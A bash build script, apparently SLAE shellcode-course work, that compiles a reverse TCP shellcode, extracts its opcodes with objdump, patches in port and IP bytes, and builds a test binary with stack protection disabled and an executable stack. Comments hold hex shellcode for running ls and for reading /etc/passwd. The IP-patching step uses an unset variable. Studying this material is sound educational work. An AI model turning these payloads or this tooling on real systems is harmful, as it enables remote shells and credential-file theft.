#!/bin/bash
#Author:SLAE-755 

port=4444
IP="127.0.0.1"

#clean previous compiled files
rm -f  *.o shellcode




#CHECK PARAMETERS: $1 -> PAYLOAD
if [ $# -ne 1 ]
	then
		echo -e "[!] No Payload selected\n    Using Default Payload execve /bin/ls"
		echo "    Usage: $0 [123]\n        1 is execve /bin/ls payload\n        2 is execve /bin/cat /etc/passwd payload\n        3 is TCP Bind shell on port 4444 payload"
else
	if [ $1 -eq 1 ]
		then
			echo "[+] TODO 1"
	fi

	if [ $1 -eq 2 ]
		then
			echo "[+] TODO"
	fi

	if [ $1 -eq 3 ]
		then
			echo "[+] TODO"
	fi
fi



#############################
#ls
#"\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

#cat /etc/passwd
#"\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";

#tcp bind


shellcode_name="reverse_tcp_shellcode"
./compile.sh $shellcode_name


port=$(printf "%X" $port)
port_hex=$(echo $port | awk '{printf("\\x%s\\x%s",substr($0,1,2),substr($0,3,4)); }' | sed "s/\\\/\\\\\\\\/g")


payload=$(objdump -d $shellcode_name|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g')
cp shellcode_template.c shellcode.c
payload2=$(echo $payload | sed "s/\\\/\\\\\\\/g")

#injecting shellcode
sed  -i "s/XXX/$payload2/g" shellcode.c

#changing port in the shellcode
sed  -i "s/\\\x11\\\x5c/$port_hex/g" shellcode.c

#changing IP in the shellcode
encoded_ip=$(echo $encoded_ip |  sed "s/\\\/\\\\\\\\/g")
sed  -i "s/\\\x80\\\xff\\\xff\\\xfe/$encoded_ip/g" shellcode.c


gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode
